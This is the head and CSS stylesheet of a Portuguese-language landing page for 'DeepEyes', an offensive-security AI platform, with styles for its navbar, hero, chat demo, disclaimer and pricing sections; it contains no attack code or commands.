<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>DeepEyes - IA de Segurança Ofensiva</title>
    <link rel="icon" type="image/png" href="/logo.png">
    <link rel="apple-touch-icon" href="/logo.png">
    <meta name="theme-color" content="#0a0a0f">
    <meta name="description" content="DeepEyes - Plataforma de IA especializada em segurança ofensiva. Pentest, Red Team e simulações APT em ambiente controlado.">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-primary: #0a0a0f;
            --bg-secondary: #12121a;
            --bg-card: #1a1a24;
            --accent-green: #00ff88;
            --accent-cyan: #00d4ff;
            --accent-blue: #3b82f6;
            --accent-purple: #8b5cf6;
            --text-primary: #ffffff;
            --text-secondary: #a0a0b0;
            --border-color: #2a2a3a;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.6;
            overflow-x: hidden;
        }

        .mono {
            font-family: 'JetBrains Mono', monospace;
        }

        html {
            scroll-behavior: smooth;
        }

        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-secondary);
        }

        ::-webkit-scrollbar-thumb {
            background: linear-gradient(180deg, var(--accent-cyan), var(--accent-green));
            border-radius: 4px;
        }

        /* App Structure */
        .app {
            position: relative;
            min-height: 100vh;
        }

        .global-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }

        .content-wrapper {
            position: relative;
            z-index: 1;
        }

        .fade-section {
            transition: opacity 0.1s ease-out, transform 0.1s ease-out;
            will-change: opacity, transform;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        /* ========================================
           NAVBAR
           ======================================== */
        .navbar {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 1000;
            width: 90%;
            max-width: 900px;
        }

        .navbar-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 20px;
            background: rgba(10, 10, 15, 0.9);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(0, 212, 255, 0.15);
            border-radius: 50px;
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
            gap: 16px;
        }

        .navbar-logo {
            display: flex;
            align-items: center;
            gap: 8px;
            text-decoration: none;
            color: var(--text-primary);
            flex-shrink: 0;
        }

        .navbar-logo img {
            width: 32px;
            height: 32px;
            object-fit: contain;
        }

        .logo-text {
            font-family: 'JetBrains Mono', monospace;
            font-weight: 600;
            font-size: 1rem;
            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-green));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .beta-badge {
            font-size: 0.6rem;
            padding: 2px 6px;
            background: var(--accent-purple);
            border-radius: 4px;
            font-weight: 600;
            color: white;
        }

        .navbar-links {
            display: flex;
            align-items: center;
            gap: 24px;
            flex: 1;
            justify-content: center;
        }

        .navbar-links a {
            color: var(--text-secondary);
            text-decoration: none;
            font-size: 0.85rem;
            font-weight: 500;
            transition: color 0.3s ease;
            white-space: nowrap;
        }

        .navbar-links a:hover {
            color: var(--accent-cyan);
        }

        .navbar-actions {
            display: flex;
            align-items: center;
            flex-shrink: 0;
        }

        .btn-enter {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 8px 18px;
            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-green));
            border: none;
            border-radius: 25px;
            color: var(--bg-primary);
            font-weight: 600;
            font-size: 0.8rem;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            white-space: nowrap;
        }

        .btn-enter:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(0, 212, 255, 0.4);
        }

        .navbar-toggle {
            display: none;
            background: none;
            border: none;
            cursor: pointer;
            padding: 8px;
            color: var(--accent-cyan);
            font-size: 1.4rem;
            line-height: 1;
        }

        /* Tools Dropdown */
        .tools-dropdown {
            position: relative;
        }

        .tools-trigger {
            display: flex;
            align-items: center;
            gap: 4px;
            cursor: pointer;
        }

        .dropdown-arrow {
            font-size: 0.7rem;
            transition: transform 0.2s;
        }

        .tools-dropdown.open .dropdown-arrow {
            transform: rotate(180deg);
        }

        .tools-menu {
            position: absolute;
            top: calc(100% + 10px);
            left: 50%;
            transform: translateX(-50%);
            min-width: 160px;
            background: rgba(10, 10, 15, 0.95);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(0, 212, 255, 0.2);
            border-radius: 12px;
            padding: 8px 0;
            opacity: 0;
            visibility: hidden;
            transition: all 0.2s ease;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
            z-index: 1001;
        }

        .tools-dropdown.open .tools-menu {
            opacity: 1;
            visibility: visible;
        }

        .tools-menu a {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px 16px;
            color: var(--text-secondary) !important;
            font-size: 0.85rem;
            transition: all 0.2s;
        }

        .tools-menu a:hover {
            background: rgba(0, 255, 136, 0.1);
            color: var(--accent-green) !important;
        }

        .tool-icon {
            font-size: 1rem;
        }

        @media (max-width: 768px) {
            .navbar {
                width: 95%;
                top: 10px;
            }

            .navbar-container {
                padding: 12px 16px;
                border-radius: 25px;
            }

            .navbar-logo img {
                width: 28px;
                height: 28px;
            }

            .logo-text {
                font-size: 0.9rem;
            }

            .navbar-links {
                display: none;
            }

            .navbar-links.active {
                display: flex;
                position: absolute;
                top: 60px;
                left: 0;
                right: 0;
                flex-direction: column;
                background: rgba(10, 10, 15, 0.98);
                backdrop-filter: blur(20px);
                border: 1px solid rgba(0, 212, 255, 0.15);
                border-radius: 16px;
                padding: 16px;
                gap: 12px;
            }

            .navbar-links.active a {
                padding: 10px 16px;
                border-radius: 8px;
            }

            .navbar-links.active a:hover {
                background: rgba(0, 212, 255, 0.1);
            }

            .navbar-toggle {
                display: flex;
                align-items: center;
                justify-content: center;
            }

            .navbar-actions {
                display: none;
            }

            .tools-dropdown.open .tools-menu {
                position: static;
                transform: none;
                background: rgba(0, 0, 0, 0.3);
                margin-top: 8px;
                border: none;
                box-shadow: none;
            }
        }
        /* ========================================
           HERO
           ======================================== */
        .hero {
            position: relative;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            background: transparent;
        }

        .hero-content {
            position: relative;
            z-index: 2;
            text-align: center;
            max-width: 900px;
            padding: 0 20px;
            padding-top: 80px;
        }

        .hero-logo {
            display: block;
            width: 200px;
            height: 200px;
            object-fit: contain;
            margin: 0 auto 24px;
        }

        .hero-badge {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            padding: 8px 20px;
            background: rgba(0, 212, 255, 0.1);
            border: 1px solid rgba(0, 212, 255, 0.3);
            border-radius: 50px;
            font-size: 0.85rem;
            color: var(--accent-cyan);
            margin-bottom: 30px;
        }

        .pulse {
            width: 8px;
            height: 8px;
            background: var(--accent-cyan);
            border-radius: 50%;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(0, 212, 255, 0.7); }
            50% { opacity: 0.8; box-shadow: 0 0 0 10px rgba(0, 212, 255, 0); }
        }

        .hero-title {
            font-size: 3.5rem;
            font-weight: 700;
            line-height: 1.4;
            margin-bottom: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
        }

        .hero-title .hero-welcome {
            font-size: 1.8rem;
            font-weight: 500;
            color: #ffffff;
        }

        .hero-title .highlight {
            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-green));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-size: clamp(3rem, 10vw, 6rem);
            font-weight: 900;
            letter-spacing: -2px;
        }

        /* Fuzzy Text Effect */
        .fuzzy-text {
            position: relative;
            display: inline-block;
            min-height: 1.2em;
        }

        .fuzzy-text canvas {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            pointer-events: auto;
        }

        .fuzzy-text.active {
            color: transparent !important;
            -webkit-text-fill-color: transparent !important;
            background: transparent !important;
        }

        /* Ghost Cursor Global Effect */
        #ghost-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }

        .hero-title .subtitle {
            font-size: 1.3rem;
            font-weight: 400;
            color: #ffffff;
            margin-top: 5px;
        }

        .hero-description {
            font-size: 1.2rem;
            color: var(--text-secondary);
            margin-bottom: 40px;
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
        }

        .hero-actions {
            display: flex;
            gap: 16px;
            justify-content: center;
            margin-bottom: 60px;
        }

        .btn-primary {
            position: relative;
            padding: 16px 32px;
            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-green));
            border: none;
            border-radius: 12px;
            color: var(--bg-primary);
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            overflow: hidden;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 40px rgba(0, 212, 255, 0.3);
        }

        .btn-glow {
            position: absolute;
            inset: 0;
            background: linear-gradient(135deg, transparent, rgba(255,255,255,0.2), transparent);
            transform: translateX(-100%);
            transition: transform 0.5s ease;
        }

        .btn-primary:hover .btn-glow {
            transform: translateX(100%);
        }

        .btn-secondary {
            padding: 16px 32px;
            background: transparent;
            border: 1px solid var(--border-color);
            border-radius: 12px;
            color: var(--text-primary);
            font-size: 0.9rem;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
        }

        .btn-secondary:hover {
            border-color: var(--accent-cyan);
            color: var(--accent-cyan);
        }

        .hero-terminal {
            max-width: 500px;
            margin: 0 auto;
            background: rgba(18, 18, 26, 0.9);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            overflow: hidden;
            text-align: left;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        }

        .terminal-header {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 12px 16px;
            background: rgba(0, 0, 0, 0.3);
            border-bottom: 1px solid var(--border-color);
        }

        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }

        .dot.red { background: #ff5f56; }
        .dot.yellow { background: #ffbd2e; }
        .dot.green { background: #27ca40; }

        .terminal-title {
            margin-left: auto;
            font-size: 0.75rem;
            color: var(--text-secondary);
        }

        .terminal-body {
            padding: 16px;
            font-size: 0.85rem;
            line-height: 1.8;
        }

        .terminal-body p {
            margin: 0;
        }

        .prompt {
            color: var(--accent-cyan);
            margin-right: 8px;
        }

        .output {
            color: var(--text-secondary);
        }

        .cursor {
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }

        @media (max-width: 1024px) {
            .hero-title .highlight {
                font-size: clamp(2.5rem, 8vw, 5rem);
            }
        }

        @media (max-width: 768px) {
            .hero {
                min-height: auto;
                padding: 100px 15px 50px;
            }
            
            .hero-content {
                padding: 0 10px;
            }
            
            .hero-title {
                gap: 10px;
            }
            
            .hero-title .hero-welcome {
                font-size: 1.2rem;
            }
            
            .hero-title .highlight {
                font-size: clamp(2rem, 12vw, 3.5rem);
                letter-spacing: -1px;
            }
            
            .hero-title .subtitle {
                font-size: 1rem;
            }
            
            .hero-description {
                font-size: 1rem;
                padding: 0 10px;
                margin-bottom: 30px;
            }
            
            .hero-actions {
                flex-direction: column;
                align-items: center;
                gap: 12px;
                width: 100%;
            }
            
            .btn-primary, .btn-secondary {
                width: 100%;
                max-width: 280px;
                justify-content: center;
                padding: 14px 24px;
            }
            
            .hero-terminal {
                max-width: 100%;
                margin: 0 10px;
            }
        }
        
        @media (max-width: 480px) {
            .hero {
                padding: 90px 10px 40px;
            }
            
            .hero-title .hero-welcome {
                font-size: 1rem;
            }
            
            .hero-title .highlight {
                font-size: clamp(1.8rem, 14vw, 2.5rem);
            }
            
            .hero-title .subtitle {
                font-size: 0.9rem;
            }
            
            .hero-description {
                font-size: 0.9rem;
            }
        }

        /* ========================================
           NO RESTRICTIONS
           ======================================== */
        .no-restrictions {
            padding: 100px 20px;
        }

        .nr-content {
            max-width: 900px;
            margin: 0 auto;
            text-align: center;
        }

        .nr-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 8px 16px;
            background: rgba(139, 92, 246, 0.2);
            border: 1px solid rgba(139, 92, 246, 0.4);
            border-radius: 50px;
            font-size: 0.75rem;
            color: var(--accent-purple);
            letter-spacing: 2px;
            margin-bottom: 24px;
        }

        .nr-title {
            font-size: 2.5rem;
            font-weight: 700;
            margin-bottom: 16px;
        }

        .nr-title .highlight {
            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-green));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .nr-subtitle {
            color: var(--text-secondary);
            font-size: 1.1rem;
            max-width: 500px;
            margin: 0 auto 50px;
            line-height: 1.6;
        }

        .nr-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 16px;
            margin-bottom: 50px;
        }

        .nr-card {
            padding: 28px 20px;
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            text-align: center;
            transition: all 0.3s ease;
        }

        .nr-card:hover {
            border-color: var(--accent-cyan);
            transform: translateY(-4px);
        }

        .nr-icon {
            width: 56px;
            height: 56px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(0, 212, 255, 0.1);
            border-radius: 14px;
            color: var(--accent-cyan);
            margin: 0 auto 16px;
        }

        .nr-icon svg {
            filter: drop-shadow(0 0 8px rgba(0, 212, 255, 0.5));
        }

        .nr-card h3 {
            font-size: 1rem;
            font-weight: 600;
            margin-bottom: 8px;
            color: var(--text-primary);
        }

        .nr-card p {
            font-size: 0.85rem;
            color: var(--text-secondary);
            line-height: 1.5;
        }

        .nr-terminal {
            max-width: 420px;
            margin: 0 auto;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 20px;
            text-align: left;
        }

        .terminal-line {
            margin-bottom: 12px;
        }

        .terminal-line .cmd {
            color: var(--text-primary);
            margin-left: 8px;
        }

        .terminal-output p {
            margin: 4px 0;
            font-size: 0.8rem;
            color: var(--text-secondary);
        }

        .terminal-output .success {
            color: var(--accent-green);
        }

        .terminal-output .highlight {
            color: var(--accent-cyan);
            margin-top: 8px;
        }

        @media (max-width: 900px) {
            .nr-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        @media (max-width: 500px) {
            .no-restrictions {
                padding: 60px 15px;
            }
            
            .nr-title {
                font-size: 1.5rem;
            }
            
            .nr-subtitle {
                font-size: 0.95rem;
                margin-bottom: 30px;
            }
            
            .nr-grid {
                grid-template-columns: 1fr;
                gap: 12px;
            }
            
            .nr-card {
                padding: 20px 15px;
            }
            
            .nr-card h3 {
                font-size: 0.95rem;
            }
            
            .nr-card p {
                font-size: 0.8rem;
            }
        }

        /* ========================================
           HOW IT WORKS
           ======================================== */
        .how-it-works {
            padding: 100px 20px;
            backdrop-filter: blur(10px);
        }

        .section-header {
            text-align: center;
            margin-bottom: 60px;
        }

        .section-tag {
            display: inline-block;
            color: var(--accent-cyan);
            font-size: 0.85rem;
            margin-bottom: 16px;
            letter-spacing: 1px;
        }

        .section-title {
            font-size: 2.5rem;
            font-weight: 700;
            margin-bottom: 16px;
        }

        .section-subtitle {
            color: var(--text-secondary);
            font-size: 1.1rem;
            max-width: 500px;
            margin: 0 auto;
        }

        .modes-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 24px;
            margin-bottom: 60px;
        }

        .mode-card {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 20px;
            padding: 32px;
            transition: all 0.3s ease;
        }

        .mode-card:hover {
            border-color: var(--accent-cyan);
            transform: translateY(-8px);
            box-shadow: 0 20px 40px rgba(0, 212, 255, 0.1);
        }

        .mode-icon {
            margin-bottom: 20px;
            color: var(--accent-cyan);
        }

        .mode-icon svg {
            filter: drop-shadow(0 0 12px rgba(0, 212, 255, 0.6));
        }

        .mode-title {
            font-size: 1.3rem;
            font-weight: 600;
            margin-bottom: 12px;
        }

        .mode-description {
            color: var(--text-secondary);
            font-size: 0.95rem;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .mode-features {
            list-style: none;
        }

        .mode-features li {
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--text-secondary);
            font-size: 0.85rem;
            margin-bottom: 8px;
        }

        .check {
            color: var(--accent-cyan);
        }

        .terminal-mockup {
            max-width: 700px;
            margin: 0 auto;
            background: rgba(18, 18, 26, 0.95);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5);
        }

        .terminal-mockup .terminal-header {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 14px 18px;
            background: rgba(0, 0, 0, 0.4);
            border-bottom: 1px solid var(--border-color);
        }

        .terminal-mockup .terminal-body {
            padding: 20px;
            font-size: 0.85rem;
            line-height: 1.9;
        }

        .terminal-mockup .output.highlight {
            color: #ffbd2e;
        }

        .terminal-mockup .output.success {
            color: var(--accent-cyan);
        }

        @media (max-width: 768px) {
            .section-title {
                font-size: 1.8rem;
            }
        }

        /* ========================================
           FEATURES
           ======================================== */
        .features {
            padding: 100px 20px;
        }

        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
        }

        .feature-card {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 28px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .feature-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, var(--accent-cyan), var(--accent-green));
            transform: scaleX(0);
            transition: transform 0.3s ease;
        }

        .feature-card:hover::before {
            transform: scaleX(1);
        }

        .feature-card:hover {
            border-color: var(--accent-cyan);
            transform: translateY(-4px);
        }

        .feature-icon {
            margin-bottom: 16px;
            color: var(--accent-cyan);
        }

        .feature-icon svg {
            filter: drop-shadow(0 0 10px rgba(0, 212, 255, 0.5));
        }

        .feature-title {
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 10px;
        }

        .feature-description {
            color: var(--text-secondary);
            font-size: 0.9rem;
            line-height: 1.6;
        }

        /* ========================================
           CHAT DEMO - ESTILO DO SISTEMA
           ======================================== */
        .chat-demo {
            padding: 100px 20px;
        }

        .chat-container {
            max-width: 800px;
            margin: 0 auto;
            background: linear-gradient(135deg, rgba(10, 10, 15, 0.95), rgba(13, 17, 23, 0.95));
            border: 1px solid rgba(0, 255, 136, 0.2);
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5), 0 0 60px rgba(0, 255, 136, 0.05);
        }

        .chat-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 16px 20px;
            background: rgba(0, 0, 0, 0.4);
            border-bottom: 1px solid rgba(0, 255, 136, 0.15);
        }

        .chat-header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .chat-logo {
            width: 32px;
            height: 32px;
            object-fit: contain;
            filter: drop-shadow(0 0 8px rgba(0, 255, 136, 0.5));
        }

        .chat-title {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            color: var(--accent-green);
            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
        }

        .chat-status {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.8rem;
            color: var(--text-secondary);
        }

        .status-dot {
            width: 8px;
            height: 8px;
            background: var(--accent-green);
            border-radius: 50%;
            animation: pulse 2s infinite;
            box-shadow: 0 0 10px rgba(0, 255, 136, 0.8);
        }

        .chat-mode-badge {
            font-size: 0.65rem;
            padding: 4px 10px;
            background: rgba(0, 255, 136, 0.15);
            border: 1px solid rgba(0, 255, 136, 0.3);
            border-radius: 4px;
            color: var(--accent-green);
            font-family: 'JetBrains Mono', monospace;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .chat-messages {
            padding: 24px;
            max-height: 480px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 20px;
            background: linear-gradient(180deg, rgba(0,0,0,0.2) 0%, transparent 100%);
        }

        .demo-message {
            display: flex;
            gap: 12px;
            animation: fadeInUp 0.3s ease;
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .demo-message.user {
            flex-direction: row-reverse;
        }

        .demo-avatar {
            width: 36px;
            height: 36px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            font-size: 0.9rem;
        }

        .demo-avatar.ai {
            background: linear-gradient(135deg, rgba(0, 255, 136, 0.2), rgba(0, 212, 255, 0.2));
            border: 1px solid rgba(0, 255, 136, 0.3);
        }

        .demo-avatar.user {
            background: linear-gradient(135deg, rgba(0, 212, 255, 0.2), rgba(139, 92, 246, 0.2));
            border: 1px solid rgba(0, 212, 255, 0.3);
        }

        .demo-bubble {
            max-width: 85%;
            padding: 14px 18px;
            border-radius: 12px;
            font-size: 0.9rem;
            line-height: 1.6;
        }

        .demo-message.user .demo-bubble {
            background: linear-gradient(135deg, rgba(0, 212, 255, 0.15), rgba(139, 92, 246, 0.15));
            border: 1px solid rgba(0, 212, 255, 0.25);
            border-top-right-radius: 4px;
            color: var(--text-primary);
        }

        .demo-message.ai .demo-bubble {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(0, 255, 136, 0.15);
            border-top-left-radius: 4px;
            color: var(--text-secondary);
        }

        .demo-bubble pre {
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
        }

        .demo-bubble .code-block {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(0, 255, 136, 0.2);
            border-radius: 8px;
            padding: 12px;
            margin: 10px 0;
            overflow-x: auto;
        }

        .demo-bubble .code-block code {
            color: var(--accent-green);
            font-size: 0.8rem;
        }

        .demo-bubble .warning {
            color: var(--accent-orange);
            font-size: 0.8rem;
            margin-top: 10px;
            padding: 8px 12px;
            background: rgba(249, 115, 22, 0.1);
            border-left: 2px solid var(--accent-orange);
            border-radius: 4px;
        }

        .chat-input-demo {
            display: flex;
            gap: 12px;
            padding: 16px 20px;
            background: rgba(0, 0, 0, 0.3);
            border-top: 1px solid rgba(0, 255, 136, 0.15);
        }

        .chat-input-demo input {
            flex: 1;
            padding: 14px 18px;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(0, 255, 136, 0.2);
            border-radius: 12px;
            color: var(--text-secondary);
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            outline: none;
        }

        .chat-input-demo input::placeholder {
            color: rgba(160, 160, 176, 0.5);
        }

        .chat-send-btn {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, var(--accent-green), var(--accent-cyan));
            border: none;
            border-radius: 12px;
            color: var(--bg-primary);
            font-size: 1.2rem;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .chat-send-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.4);
        }
        }

        .chat-input input {
            flex: 1;
            padding: 14px 18px;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            color: var(--text-primary);
            font-size: 0.9rem;
            outline: none;
            transition: border-color 0.3s ease;
        }

        .chat-input input:focus {
            border-color: var(--accent-cyan);
        }

        .chat-input input::placeholder {
            color: var(--text-secondary);
        }

        .send-btn {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-green));
            border: none;
            border-radius: 12px;
            color: var(--bg-primary);
            font-size: 1.2rem;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .send-btn:hover {
            transform: scale(1.05);
        }

        /* ========================================
           DISCLAIMER
           ======================================== */
        .disclaimer {
            padding: 60px 20px;
            backdrop-filter: blur(10px);
        }

        .disclaimer-box {
            max-width: 800px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            gap: 20px;
            padding: 24px 32px;
            background: rgba(255, 189, 46, 0.08);
            border: 1px solid rgba(255, 189, 46, 0.3);
            border-radius: 16px;
        }

        .disclaimer-icon {
            flex-shrink: 0;
            color: #ffbd2e;
            font-size: 2rem;
        }

        .disclaimer-text {
            color: var(--text-secondary);
            font-size: 0.95rem;
            line-height: 1.6;
        }

        .disclaimer-text strong {
            color: #ffbd2e;
        }

        @media (max-width: 768px) {
            .disclaimer-box {
                flex-direction: column;
                text-align: center;
            }
        }

        /* ========================================
           CTA
           ======================================== */
        .cta {
            padding: 140px 20px;
            position: relative;
            overflow: hidden;
        }

        .cta::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 800px;
            height: 800px;
            background: radial-gradient(circle, rgba(0, 212, 255, 0.15) 0%, rgba(0, 255, 136, 0.08) 30%, transparent 70%);
            pointer-events: none;
            animation: cta-pulse 4s ease-in-out infinite;
        }

        .cta::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 500px;
            height: 500px;
            background: radial-gradient(circle, rgba(139, 92, 246, 0.1) 0%, transparent 60%);
            pointer-events: none;
            animation: cta-pulse 4s ease-in-out infinite reverse;
        }

        @keyframes cta-pulse {
            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.8; }
            50% { transform: translate(-50%, -50%) scale(1.1); opacity: 1; }
        }

        .cta-content {
            position: relative;
            text-align: center;
            max-width: 700px;
            margin: 0 auto;
            z-index: 1;
        }

        .cta-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 8px 16px;
            background: rgba(0, 212, 255, 0.1);
            border: 1px solid rgba(0, 212, 255, 0.3);
            border-radius: 50px;
            font-size: 0.8rem;
            color: var(--accent-cyan);
            margin-bottom: 24px;
            font-family: 'JetBrains Mono', monospace;
        }

        .cta-badge .pulse-dot {
            width: 8px;
            height: 8px;
            background: var(--accent-green);
            border-radius: 50%;
            animation: pulse 2s infinite;
        }

        .cta-title {
            font-size: 3rem;
            font-weight: 700;
            margin-bottom: 20px;
            line-height: 1.2;
        }

        .cta-title .highlight {
            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-green));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .cta-subtitle {
            color: var(--text-secondary);
            font-size: 1.15rem;
            margin-bottom: 40px;
            line-height: 1.7;
        }

        .cta-actions {
            display: flex;
            gap: 16px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .cta-button {
            position: relative;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            padding: 18px 36px;
            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-green));
            border: none;
            border-radius: 50px;
            color: var(--bg-primary);
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            overflow: hidden;
            transition: all 0.3s ease;
            text-decoration: none;
        }

        .cta-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.5s ease;
        }

        .cta-button:hover::before {
            left: 100%;
        }

        .cta-button:hover {
            transform: translateY(-4px) scale(1.02);
            box-shadow: 0 20px 60px rgba(0, 212, 255, 0.4), 0 0 30px rgba(0, 255, 136, 0.2);
        }

        .cta-button-secondary {
            padding: 18px 36px;
            background: transparent;
            border: 1px solid rgba(0, 212, 255, 0.3);
            border-radius: 50px;
            color: var(--text-primary);
            font-weight: 500;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
        }

        .cta-button-secondary:hover {
            border-color: var(--accent-cyan);
            background: rgba(0, 212, 255, 0.1);
            color: var(--accent-cyan);
        }

        .cta-note {
            margin-top: 24px;
            font-size: 0.85rem;
            color: var(--text-secondary);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .cta-note svg {
            color: var(--accent-green);
        }

        @media (max-width: 768px) {
            .cta {
                padding: 100px 20px;
            }
            
            .cta-title {
                font-size: 2rem;
            }
            
            .cta-button, .cta-button-secondary {
                padding: 16px 28px;
                font-size: 0.95rem;
                width: 100%;
                justify-content: center;
            }
            
            .cta-actions {
                flex-direction: column;
                align-items: center;
            }
            
            .cta-title .fuzzy-text canvas {
                transform: translate(-50%, -50%) scale(0.8);
            }
        }

        /* ========================================
           PRICING SECTION
           ======================================== */
        .pricing-section {
            padding: 100px 20px;
            backdrop-filter: blur(10px);
        }

        .pricing-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 24px;
            max-width: 1100px;
            margin: 0 auto;
        }

        .pricing-card {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 20px;
            padding: 32px;
            position: relative;
            transition: all 0.3s ease;
        }

        .pricing-card:hover {
            transform: translateY(-8px);
            border-color: rgba(0, 212, 255, 0.3);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
        }

